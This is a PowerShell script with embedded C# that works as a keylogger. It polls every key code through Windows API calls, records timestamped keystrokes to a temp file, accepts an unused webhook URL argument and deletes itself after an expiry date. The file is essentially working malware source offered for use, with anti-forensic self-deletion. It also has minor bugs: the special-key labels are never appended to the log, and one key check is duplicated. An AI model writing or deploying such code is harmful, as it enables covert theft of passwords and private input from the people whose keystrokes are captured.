# Ensure that the webhook URL is set directly from the command line
$webhookURL = $args[0]  # The first argument is the webhook URL

# Define the path to the temp log file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')

# Set the default expiry date to 30 days from today if no expiry date is passed
if ($args.Count -gt 1) {
    # If the second argument is provided, parse it as the expiry date
    $expiryDate = [datetime]::ParseExact($args[1], 'yyyy-MM-dd', $null)
} else {
    # If no expiry date is passed, default to 30 days from today
    $expiryDate = (Get-Date).AddDays(30)
}

# Check if the script has expired
$currentDate = Get-Date
if ($currentDate -gt $expiryDate) {
    # If the script has expired, delete itself
    Write-Host "Script has expired. Deleting script file..."
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}

# Check if the custom utility type is already loaded
$customUtilityType = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { 
    $_.GetTypes() | Where-Object { $_.Name -eq 'KeyCaptureUtility' }
}

if (-not $customUtilityType) {
    # Add Type for custom utility class
    Add-Type @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class KeyCaptureUtility
{
    // DLL Imports for keyboard input functions
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

    public static void CaptureInput(string filePath)
    {
        StringBuilder captureBuffer = new StringBuilder();
        var lastKeypressTime = System.Diagnostics.Stopwatch.StartNew();
        TimeSpan keypressThreshold = TimeSpan.FromSeconds(10);

        // Ensure the file exists, create it if it doesn't
        if (!File.Exists(filePath))
        {
            File.Create(filePath).Dispose();
            Console.WriteLine("File created: " + filePath);  // Log file creation
        }

        // Continuous loop to capture keypresses
        while (true)
        {
            bool keyPressed = false;

            // Check if the last key press time exceeds threshold
            while (lastKeypressTime.Elapsed < keypressThreshold)
            {
                Thread.Sleep(30);  // Sleep for 30 ms

                // Iterate through all possible virtual keycodes
                for (int asc = 8; asc <= 254; asc++)
                {
                    short keyst = GetAsyncKeyState(asc);

                    // Check if the key is pressed (key state = -32767 means pressed)
                    if (keyst == -32767)
                    {
                        keyPressed = true;
                        lastKeypressTime.Restart();  // Reset inactivity timer

                        // Translate the key to a readable character
                        int vtkey = MapVirtualKey((uint)asc, 3);
                        byte[] kbst = new byte[256];
                        GetKeyboardState(kbst);
                        StringBuilder logChar = new StringBuilder();

                        // Get the character for the key
                        if (ToUnicode((uint)asc, (uint)vtkey, kbst, logChar, logChar.Capacity, 0) != 0)
                        {
                            string charPressed = logChar.ToString();

                            // Handle special keys like Backspace, Enter, Escape, Shift, Alt, and other common keys
                            if (asc == 8) charPressed = "[BKSP]";        // Backspace
                            else if (asc == 13) charPressed = "[ENTER]";  // Enter
                            else if (asc == 27) charPressed = "[ESC]";    // Escape
                            else if (asc == 16) charPressed = "[SHIFT]";  // Shift
                            else if (asc == 17) charPressed = "[CTRL]";   // Control (Ctrl)
                            else if (asc == 18) charPressed = "[ALT]";    // Alt
                            else if (asc == 91 || asc == 92)             // Windows key or Command key (Windows 91, Mac Command key 91 or 92)
                                charPressed = "[CMD]";                   // Command (or Windows) key
                            else if (asc == 32) charPressed = "[SPACE]";  // Spacebar
                            else if (asc == 9) charPressed = "[TAB]";     // Tab
                            else if (asc == 20) charPressed = "[CAPSLOCK]"; // CapsLock
                            else if (asc == 27) charPressed = "[ESC]";    // Escape
                            else if (asc == 33) charPressed = "[PAGEUP]";  // Page Up
                            else if (asc == 34) charPressed = "[PAGEDOWN]";// Page Down
                            else if (asc == 35) charPressed = "[END]";    // End
                            else if (asc == 36) charPressed = "[HOME]";   // Home
                            else if (asc == 37) charPressed = "[LEFTARROW]"; // Left Arrow
                            else if (asc == 38) charPressed = "[UPARROW]";   // Up Arrow
                            else if (asc == 39) charPressed = "[RIGHTARROW]"; // Right Arrow
                            else if (asc == 40) charPressed = "[DOWNARROW]";  // Down Arrow
                            else if (asc == 44) charPressed = "[PRINTSCREEN]"; // Print Screen
                            else if (asc == 45) charPressed = "[INSERT]";     // Insert
                            else if (asc == 46) charPressed = "[DELETE]";     // Delete
                            else if (asc == 144) charPressed = "[NUMLOCK]";   // Num Lock
                            else if (asc == 145) charPressed = "[SCROLLLOCK]"; // Scroll Lock
                            else {
                                // For all other keys, we translate normally
                                captureBuffer.Append(charPressed);
                            }
                        }
                    }
                }
            }

            if (keyPressed)
            {
                // Save input to the file with a timestamp
                string timestamp = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
                string message = timestamp + " : " + captureBuffer.ToString() + "\r\n";
                File.AppendAllText(filePath, message);
                Console.WriteLine("Input saved: " + message);  // Log the saved message
                captureBuffer.Clear();  // Clear the input buffer after saving
            }

            // Reset the stopwatch and continue checking
            lastKeypressTime.Restart();
        }
    }
}

"@
}

# Call the CaptureInput method to start capturing inputs (synchronously)
[KeyCaptureUtility]::CaptureInput($tempFilePath)
